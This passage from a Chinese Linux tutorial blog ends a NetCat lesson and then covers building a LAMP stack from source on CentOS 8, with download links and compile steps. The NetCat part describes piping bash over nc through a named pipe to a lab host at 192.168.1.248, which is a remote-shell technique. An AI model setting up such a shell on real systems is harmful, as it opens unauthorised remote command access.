class="line">这里通过nc将bash重定向到B主机上，通过命名管道可以执行多条命令</span><br></pre></td></tr></table></figure>

<p><strong>B主机：</strong></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">192.168</span><span class="number">.1</span><span class="number">.248</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p><img src="/NetCat%EF%BC%88nc%EF%BC%89/13.jpg" alt="13"></p>
<p><img src="/NetCat%EF%BC%88nc%EF%BC%89/14.jpg" alt="14"></p>
<p>mkfifo命令是创建命名管道，命名管道的作用是将输出信道化到不同的终端。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">|（竖线）为管道，是两个进程之间的通信通道</span><br><span class="line">例如：<span class="keyword">ls</span> | <span class="keyword">grep</span> txt</span><br><span class="line"><span class="keyword">ls</span>和<span class="keyword">grep</span>由|分开，管道创建了程序之间的通信通道，将<span class="keyword">ls</span>的输出作为输入传给<span class="keyword">grep</span></span><br><span class="line"></span><br><span class="line">由mkfifo创建出来的就是一个命名管道</span><br><span class="line">例如：mkfifo pipe2</span><br><span class="line">pipe2就是一个命名管道</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">在第一个终端执行</span><br><span class="line"><span class="keyword">ls</span> &gt; pipe2</span><br><span class="line">在第二个终端执行</span><br><span class="line"><span class="keyword">cat</span> &lt; pipe2（或<span class="keyword">cat</span> pipe2,是取一次。<span class="keyword">cat</span> &lt; pipe2是持续输入，只要有内容传到pipe2中，就会有内容输出）</span><br><span class="line">pipe2更像是一个临时存储的地方，使用<span class="keyword">cat</span> pipe2取过内容之后，再执行<span class="keyword">cat</span> pipe2 ，则不会有显示</span><br></pre></td></tr></table></figure>

<p>命名管道可以像正常文件一样访问。</p>
<p><img src="/NetCat%EF%BC%88nc%EF%BC%89/11.jpg" alt="11"></p>
<p>注意要在另一个终端打开。</p>
<p><img src="/NetCat%EF%BC%88nc%EF%BC%89/12.jpg" alt="12"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>nc可以搭配管道，实现灵活多样的功能，或者进行各种网络测试。</p>
<p><strong>参考文章：</strong></p>
<p><a href="https://zhuanlan.zhihu.com/p/83959309">https://zhuanlan.zhihu.com/p/83959309</a></p>
<p><a href="https://www.cnblogs.com/zhenghongxin/p/7029173.html">https://www.cnblogs.com/zhenghongxin/p/7029173.html</a></p>
<p><a href="https://www.cnblogs.com/old-path-white-cloud/p/11685558.html">https://www.cnblogs.com/old-path-white-cloud/p/11685558.html</a></p>
</div></article></div><div class="card"><div class="card-image"><a class="image is-7by3" href="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"><img class="thumbnail" src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/50.png" alt="LAMP环境搭建"></a></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-03-30T12:42:14.000Z" title="2020-03-30T12:42:14.000Z">2020-03-30</time><span class="level-item"><a class="link-muted" href="/categories/%E7%BD%91%E7%AB%99/">网站</a></span><span class="level-item">42 分钟 读完 (大约 6358 个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">LAMP环境搭建</a></h1><div class="content"><a id="more"></a>

<blockquote>
<p>参考文章： <a href="http://c.biancheng.net/linux_tutorial/16/">http://c.biancheng.net/linux_tutorial/16/</a> </p>
</blockquote>
<h2 id="源码包"><a href="#源码包" class="headerlink" title="源码包"></a>源码包</h2><blockquote>
<p>如果安装过程中出现错误无法解决可以改换较高版本；</p>
</blockquote>
<p><strong>Linux</strong></p>
<blockquote>
<p>CentOS8，在虚拟机中搭建环境</p>
</blockquote>
<p><a href="http://mirrors.aliyun.com/centos/8.1.1911/isos/x86_64/CentOS-8.1.1911-x86_64-dvd1.iso">http://mirrors.aliyun.com/centos/8.1.1911/isos/x86_64/CentOS-8.1.1911-x86_64-dvd1.iso</a></p>
<p><strong>Apache</strong></p>
<p><a href="https://mirrors.tuna.tsinghua.edu.cn/apache//httpd/httpd-2.4.43.tar.gz">https://mirrors.tuna.tsinghua.edu.cn/apache//httpd/httpd-2.4.43.tar.gz</a></p>
<p><strong>mysql</strong></p>
<p><a href="https://src.fedoraproject.org/lookaside/extras/community-mysql/mysql-5.5.39.tar.gz/md5/b6f0ba553fb1ac839921b1135cb184ae/mysql-5.5.39.tar.gz">https://src.fedoraproject.org/lookaside/extras/community-mysql/mysql-5.5.39.tar.gz/md5/b6f0ba553fb1ac839921b1135cb184ae/mysql-5.5.39.tar.gz</a></p>
<p><strong>PHP</strong></p>
<p><a href="https://www.php.net/distributions/php-5.5.23.tar.gz">https://www.php.net/distributions/php-5.5.23.tar.gz</a> </p>
<p><strong>PHPmyadmin</strong></p>
<p><a href="https://files.phpmyadmin.net/phpMyAdmin/4.1.4/phpMyAdmin-4.1.4-all-languages.zip">https://files.phpmyadmin.net/phpMyAdmin/4.1.4/phpMyAdmin-4.1.4-all-languages.zip</a></p>
<p><strong>libxml2_2.9.1.tar.gz</strong></p>
<p><a href="http://xmlsoft.org/sources/libxml2-2.9.10.tar.gz">http://xmlsoft.org/sources/libxml2-2.9.10.tar.gz</a> </p>
<p><strong>libmerypt-2.5.8.tar.gz</strong></p>
<p><a href="https://nchc.dl.sourceforge.net/project/mcrypt/Libmcrypt/2.5.8/libmcrypt-2.5.8.tar.gz">https://nchc.dl.sourceforge.net/project/mcrypt/Libmcrypt/2.5.8/libmcrypt-2.5.8.tar.gz</a></p>
<p><strong>mhash-0.9.9.9.tar.gz</strong> </p>
<p><a href="https://nchc.dl.sourceforge.net/project/mhash/mhash/0.9.9.9/mhash-0.9.9.9.tar.gz">https://nchc.dl.sourceforge.net/project/mhash/mhash/0.9.9.9/mhash-0.9.9.9.tar.gz</a> </p>
<p><strong>mcrypt-2-6.8-tar.gz</strong></p>
<p><a href="https://nchc.dl.sourceforge.net/project/mcrypt/MCrypt/2.6.8/mcrypt-2.6.8.tar.gz">https://nchc.dl.sourceforge.net/project/mcrypt/MCrypt/2.6.8/mcrypt-2.6.8.tar.gz</a> </p>
<p><strong>zlib-1.2.11.tar.gz</strong></p>
<p><a href="file:///D:/chrome/Downloads/zlib-1.2.11.tar.gz">file:///D:/chrome/Downloads/zlib-1.2.11.tar.gz</a></p>
<p><strong>libgd-2.1.0.tar.gz</strong></p>
<p><a href="https://bitbucket.org/libgd/gd-libgd/downloads/libgd-2.1.0.tar.gz">https://bitbucket.org/libgd/gd-libgd/downloads/libgd-2.1.0.tar.gz</a></p>
<p><strong>freetype-2.4.0.tar.gz</strong></p>
<p><a href="http://download.savannah.gnu.org/releases/freetype/freetype-2.4.0.tar.gz">http://download.savannah.gnu.org/releases/freetype/freetype-2.4.0.tar.gz</a></p>
<p><strong>libpng-1.2.59.tar.gz</strong></p>
<p><a href="ftp://ftp.simplesystems.org/pub/libpng/png/src/libpng12/libpng-1.2.59.tar.gz">ftp://ftp.simplesystems.org/pub/libpng/png/src/libpng12/libpng-1.2.59.tar.gz</a></p>
<p><strong>jpegsrc.v6b.tar.gz</strong></p>
<p><a href="http://www.ijg.org/files/jpegsrc.v6b.tar.gz">http://www.ijg.org/files/jpegsrc.v6b.tar.gz</a></p>
<p><strong>apr-1.4.6.tar.gz</strong></p>
<p><a href="http://archive.apache.org/dist/apr/apr-1.4.6.tar.gz">http://archive.apache.org/dist/apr/apr-1.4.6.tar.gz</a></p>
<p><strong>apr-util-1.4.1.tar.gz</strong></p>
<p><a href="http://archive.apache.org/dist/apr/apr-util-1.4.1.tar.gz">http://archive.apache.org/dist/apr/apr-util-1.4.1.tar.gz</a></p>
<p><strong>pcre-8.34.tar.gz</strong> </p>
<p><a href="http://sourceforge.net/projects/pcre/files/pcre/8.34/pcre-8.34.tar.gz">http://sourceforge.net/projects/pcre/files/pcre/8.34/pcre-8.34.tar.gz</a></p>
<p><strong>ncurses-6.2.tar.gz（推荐）</strong></p>
<p><a href="http://ftp.gnu.org/pub/gnu/ncurses/ncurses-6.2.tar.gz">http://ftp.gnu.org/pub/gnu/ncurses/ncurses-6.2.tar.gz</a></p>
<p><strong>memcache-3.0.8.tgz</strong></p>
<p><a href="http://pecl.php.net/get/memcache-3.0.8.tgz">http://pecl.php.net/get/memcache-3.0.8.tgz</a></p>
<p><strong>memcached-1.4.17.tar.gz</strong></p>
<p><a href="http://www.memcached.org/files/memcached-1.4.17.tar.gz">http://www.memcached.org/files/memcached-1.4.17.tar.gz</a></p>
<p><strong>解压脚本（一部分）</strong></p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# vi tar.<span class="keyword">sh</span></span><br><span class="line">#建立解压缩脚本</span><br><span class="line">#! /bin/bash</span><br><span class="line">#标称是 <span class="keyword">Shell</span>脚本</span><br><span class="line"><span class="keyword">cd</span> /usr/<span class="keyword">local</span>/src/</span><br><span class="line">#进入保存源妈包的目录</span><br><span class="line"><span class="keyword">ls</span> *.tar.gz &gt; /usr/<span class="keyword">local</span>/src/<span class="keyword">ls</span>.<span class="keyword">log</span></span><br><span class="line">#把所有以.tar .gz结尾的文件名覆盖写入<span class="keyword">ls</span>.<span class="keyword">log</span>文件</span><br><span class="line"><span class="keyword">ls</span> *.tgz &gt;&gt; /usr/<span class="keyword">local</span>/src/<span class="keyword">ls</span>.<span class="keyword">log</span></span><br><span class="line">#把所有以.tgz结尾的文件名追加写入<span class="keyword">ls</span>.<span class="keyword">log</span>文件</span><br><span class="line"><span class="keyword">file</span>=$(<span class="keyword">cat</span> /usr/<span class="keyword">local</span>/src/<span class="keyword">ls</span>.<span class="keyword">log</span>)</span><br><span class="line">#读取 Is.<span class="keyword">log</span> 文件中的内容,赋子变量<span class="keyword">file</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$file</span></span><br><span class="line">#<span class="keyword">for</span>循环,每次德环把变量<span class="keyword">file</span>中的一个文件名</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">       tar -zxf <span class="variable">$i</span></span><br><span class="line">       #解压缩毎个压缩文件</span><br><span class="line">    done</span><br><span class="line"><span class="keyword">rm</span> -rf /usr/<span class="keyword">local</span>/src/<span class="keyword">ls</span>.<span class="keyword">log</span></span><br><span class="line">#删除临时文件<span class="keyword">ls</span>.<span class="keyword">log</span></span><br></pre></td></tr></table></figure>



<h2 id="Linux-libxml2安装"><a href="#Linux-libxml2安装" class="headerlink" title="Linux libxml2安装"></a>Linux libxml2安装</h2><ol>
<li><p>先查看一下含python-devel的包</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="built_in">search</span> <span class="keyword">python</span> | <span class="keyword">grep</span> <span class="keyword">python</span>-devel</span><br></pre></td></tr></table></figure>

<img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/4.png" alt="4" style="zoom:200%;">
</li>
<li><p>安装python-devel</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y <span class="keyword">install</span> platform-python-devel.x86_64</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/5.png" alt="5"></p>
</li>
<li><p>进入解压缩之后的源码目录，因为 “./configure”、”make” 和 “make install” 操作的都是当前所在目录，所以一定要进入解压缩之后的源码目录 </p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/src/libxml2<span class="number">-2.9</span><span class="number">.10</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>编译前的准备和配置，这一步主要检查安装需要的系统环境、配置软件需要的功能选项，并生成配置安装文件 Makefile，以后的编译与编译安装过程需要依赖 Makefile 文件 </p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --<span class="built_in">prefix</span>=/usr/<span class="built_in">local</span>/libxml2/</span><br><span class="line">#“--<span class="built_in">prefix</span>=/usr/<span class="built_in">local</span>/libxml2/”用于指定安装位置</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/6.png" alt="6"></p>
<p>我们一般会将源码包安装到 /usr/local/ 目录中，这个目录是 Linux 的默认源码包安装目录，并不推荐大家随意更改。至于安装目录名称，如果只是单独安装这个软件，则目录名称可以随意指定，不一定非要叫“libxml2”。但是我们在搭建 LAMP 环境时，这个软件会被后面的软件所调用，如果修改了安装目录名称，那么后面一系列的安装命令都要进行修改，非常容易报错，所以不建议大家随意修改 </p>
</li>
<li><p>编译，也就是依靠 gcc 把源码包翻译为二进制的机器语言包 </p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">make</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/7.png" alt="7"></p>
</li>
<li><p>编译安装，这一步才会真正向 /usr/local/ 目录中写入数据，这条命令执行之后，就会建立 /usr/local/libxml2/ 目录，并在目录下生成相应的文件</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make <span class="keyword">install</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/8.png" alt="8"></p>
</li>
</ol>
<h2 id="Linux-libmcrypt安装"><a href="#Linux-libmcrypt安装" class="headerlink" title="Linux libmcrypt安装"></a>Linux libmcrypt安装</h2><ol>
<li><p>进入解压缩目录</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/src/libmcrypt<span class="number">-2.5</span><span class="number">.8</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>编译前配置，并指定安装位置</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/configure --prefix=/u</span>sr<span class="regexp">/local/</span>libmcrypt</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/9.png" alt="9"></p>
</li>
<li><p>编译</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">make</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/10.png" alt="10"></p>
</li>
<li><p>编译安装</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make <span class="keyword">install</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/11.png" alt="11"></p>
</li>
<li><p>安装 libltdl 库，在安装完 libmcrypt 之后，有些 Linux 还需要安装 libltdl 库，这个库是 libmcrypt 的子软件，就在 libmcrypt 的源码包之中，所以要进入 /usr/local/libmcrypt 目录才能看到 </p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/<span class="keyword">local</span>/src/libmcrypt<span class="number">-2.5</span><span class="number">.8</span>/libltdl</span><br><span class="line">./configure --<span class="keyword">enable</span>-ltdl-install</span><br><span class="line"><span class="built_in">make</span></span><br><span class="line"><span class="built_in">make</span> install</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/12.png" alt="12"></p>
</li>
</ol>
<h2 id="Linux-mhash和mcrypt安装"><a href="#Linux-mhash和mcrypt安装" class="headerlink" title="Linux mhash和mcrypt安装"></a>Linux mhash和mcrypt安装</h2><p><strong>Linux mhash安装</strong></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost ~]# cd /usr/local/src/mhash<span class="number">-0.9</span><span class="number">.9</span><span class="number">.9</span></span><br><span class="line">#进入解压缩目录</span><br><span class="line">[<span class="symbol">root@</span>localhost mhash<span class="number">-0.9</span><span class="number">.9</span><span class="number">.9</span>]#./configure</span><br><span class="line">#没有指定安装位置。因为在mcrypt包安装时，会在默认位置查找mhash包，如果指定了安装位置，那么mcrypt包在安装时会报错</span><br><span class="line">[<span class="symbol">root@</span>localhost mhash<span class="number">-0.9</span><span class="number">.9</span><span class="number">.9</span>]# make</span><br><span class="line">#编译</span><br><span class="line">[<span class="symbol">root@</span>localhost mhash<span class="number">-0.9</span><span class="number">.9</span><span class="number">.9</span>]# make install</span><br><span class="line">#编译安装</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/13.png" alt="13"></p>
<p><strong>Linux mcrypt安装</strong></p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># cd /usr/local/src/mcrypt-2.6.8</span></span><br><span class="line"><span class="meta">#进入源码目录</span></span><br><span class="line">[root<span class="symbol">@localhost</span> mcrypt<span class="number">-2.6</span><span class="number">.8</span>]<span class="meta"># LD_LIBRARY_PATH=/usr/local/libmcrypt/lib:/usr/local/lib ./configure --with-libmcrypt-prefix=/usr/local/libmcrypt</span></span><br><span class="line"><span class="meta">#LD_LIBRARY_PATH用于指定libmcrypt和mhash库的位置</span></span><br><span class="line"><span class="meta">#./configure为编译前准备命令，--prefix用于指定libmcrypt软件位置</span></span><br><span class="line">[root<span class="symbol">@localhost</span> mcrypt<span class="number">-2.6</span><span class="number">.8</span>]<span class="meta"># make</span></span><br><span class="line"><span class="meta">#编译</span></span><br><span class="line">[root<span class="symbol">@localhost</span> mcrypt<span class="number">-2.6</span><span class="number">.8</span>]<span class="meta"># make install</span></span><br><span class="line"><span class="meta">#编译安装</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/14.png" alt="14"></p>
<p>在这里 mcrypt 并没有安装完成。因为 mcrypt 是 PHP 的模块，所以需要等到 PHP 安装完成之后，再继续安装。 </p>
<h2 id="Linux-zlib和libpng安装"><a href="#Linux-zlib和libpng安装" class="headerlink" title="Linux zlib和libpng安装"></a>Linux zlib和libpng安装</h2><p><strong>Linux zlib安装</strong></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost ~]# cd /usr/local/src/zlib<span class="number">-1.2</span><span class="number">.11</span></span><br><span class="line">#进入zlib解压缩目录</span><br><span class="line">[<span class="symbol">root@</span>localhost zlib<span class="number">-1.2</span><span class="number">.11</span>]# ./configure</span><br><span class="line">#编译前配置，没有指定安装位置，zlib会安装到系统的默认位置。这是为了让libpng可以在默认位置中找到zlib。如果指定了zlib的安装位置，那么libpng在安装时可能会报错</span><br><span class="line">[<span class="symbol">root@</span>localhost zlib<span class="number">-1.2</span><span class="number">.11</span>]# make</span><br><span class="line">#编译</span><br><span class="line">[<span class="symbol">root@</span>localhost zlib<span class="number">-1.2</span><span class="number">.11</span>]# make install</span><br><span class="line">#编译安装</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/15.png" alt="15"></p>
<p><strong>Linux libpng安装</strong></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost zlib<span class="number">-1.2</span><span class="number">.11</span>]# cd /usr/local/src/libpng<span class="number">-1.2</span><span class="number">.59</span></span><br><span class="line">#进入libpng解压缩目录</span><br><span class="line">[<span class="symbol">root@</span>localhost libpng<span class="number">-1.2</span><span class="number">.59</span>]# ./configure --prefix=/usr/local/libpng</span><br><span class="line">#编译前配置，指定安装位置</span><br><span class="line">[<span class="symbol">root@</span>localhost libpng<span class="number">-1.2</span><span class="number">.59</span>]# make</span><br><span class="line">#编译</span><br><span class="line">[<span class="symbol">root@</span>localhost libpng<span class="number">-1.2</span><span class="number">.59</span>]# make install</span><br><span class="line">#编译安装</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/16.png" alt="16"></p>
<h2 id="Linux-jpeg6安装"><a href="#Linux-jpeg6安装" class="headerlink" title="Linux jpeg6安装"></a>Linux jpeg6安装</h2><ol>
<li><p>手工建立必需的目录</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> root]<span class="meta"># mkdir /usr/local/jpeg6</span></span><br><span class="line"><span class="meta">#建立jpeg6软件安装目录</span></span><br><span class="line">[root<span class="symbol">@localhost</span> root]<span class="meta"># mkdir /usr/local/jpeg6/bin</span></span><br><span class="line"><span class="meta">#建立存放命令的目录</span></span><br><span class="line">[root<span class="symbol">@localhost</span> root]<span class="meta"># mkdir /usr/local/jpeg6/lib</span></span><br><span class="line"><span class="meta">#创建jpeg6函数库文件所在目录</span></span><br><span class="line">[root<span class="symbol">@localhost</span> root]<span class="meta"># mkdir /usr/local/jpeg6/<span class="meta-keyword">include</span></span></span><br><span class="line"><span class="meta">#建立存放头文件的目录</span></span><br><span class="line">[root<span class="symbol">@localhost</span> root]<span class="meta"># mkdir -p /usr/local/jpeg6/man/man1</span></span><br><span class="line"><span class="meta">#建立存放帮助手册的目录</span></span><br></pre></td></tr></table></figure>

<img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/17.png" alt="17" style="zoom:200%;">

<p>注意，这些目录必须手工建立，否则安装过程会报错 </p>
</li>
<li><p>编译与安装</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> libpng<span class="number">-1.2</span><span class="number">.59</span>]<span class="meta"># cd /usr/local/src/jpeg-6b/</span></span><br><span class="line"><span class="meta">#进入jpeg6解压缩目录</span></span><br><span class="line">[root<span class="symbol">@localhost</span> jpeg<span class="number">-6</span>b]<span class="meta"># ./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-static</span></span><br><span class="line"><span class="meta">#编译前配置</span></span><br><span class="line"><span class="meta">#--prefix指定安装位置</span></span><br><span class="line"><span class="meta">#--enable-shared建立共享库使用的GNU的libtool</span></span><br><span class="line"><span class="meta">#--enable-static建立静态库使用的GNU的libtool</span></span><br><span class="line"></span><br><span class="line">[root<span class="symbol">@localhost</span> jpeg<span class="number">-6</span>b]<span class="meta"># make</span></span><br><span class="line"><span class="meta">#编译</span></span><br><span class="line">[root<span class="symbol">@localhost</span> jpeg<span class="number">-6</span>b]<span class="meta"># make install</span></span><br><span class="line"><span class="meta">#编译安装</span></span><br></pre></td></tr></table></figure>


</li>
</ol>
<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/18.png" alt="18"></p>
<p>   在上面的过程中如果直接编译会出现如下报错：</p>
<p>   <img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/23.png" alt="23"></p>
<p>   出现报错是由于libtool版本过低所导致，重新下载新版本的libtool以默认方式安装即可，过程如下：</p>
<p>   <strong>下载</strong></p>
   <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="regexp">//mi</span>rror.keystealth.org<span class="regexp">/gnu/</span>libtool<span class="regexp">/libtool-2.4.6.tar.gz</span></span><br></pre></td></tr></table></figure>

<p>   如果下载慢的话可以先在windows中下载，然后再通过WinWPS上传到linux中；直接在linux centos中下载记得要打开网络；</p>
<p>   下载完成后将<code>libtool-2.4.6.tar.gz</code>放到<code>/usr/local/src</code>目录下；</p>
<p>   <strong>安装</strong></p>
   <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进入/usr/local/src目录</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/usr/local/src</span></span><br><span class="line"><span class="comment">#解压缩源码包</span></span><br><span class="line">tar -zxvf libtool-2.4.6.tar.gz</span><br><span class="line"><span class="comment">#进入libtool-2.4.6目录</span></span><br><span class="line"><span class="keyword">cd</span> libtool-2.4.6</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置编译安装</span></span><br><span class="line"><span class="string">./configure</span></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>   <img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/21.png" alt="21"></p>
<p>   <img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/22.png" alt="22"></p>
<p>   <strong>修改配置文件</strong></p>
<p>   进入jpeg-6b的源码目录，执行以下步骤 ：</p>
   <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp <span class="regexp">/usr/</span>share<span class="regexp">/libtool/</span>build-aux<span class="regexp">/config.sub ./</span></span><br><span class="line">cp <span class="regexp">/usr/</span>share<span class="regexp">/libtool/</span>build-aux<span class="regexp">/config.guess ./</span></span><br></pre></td></tr></table></figure>

<p>   <img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/24.png" alt="24"></p>
<p>   <img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/25.png" alt="25"></p>
<ol start="3">
<li><p>重新安装jpeg6</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/<span class="keyword">local</span>/src/jpeg<span class="number">-6</span>b/</span><br><span class="line">./configure --prefix=/usr/<span class="keyword">local</span>/jpeg6/ --<span class="keyword">enable</span>-shared --<span class="keyword">enable</span>-static</span><br><span class="line"><span class="built_in">make</span></span><br><span class="line"><span class="built_in">make</span> install</span><br></pre></td></tr></table></figure>



</li>
</ol>
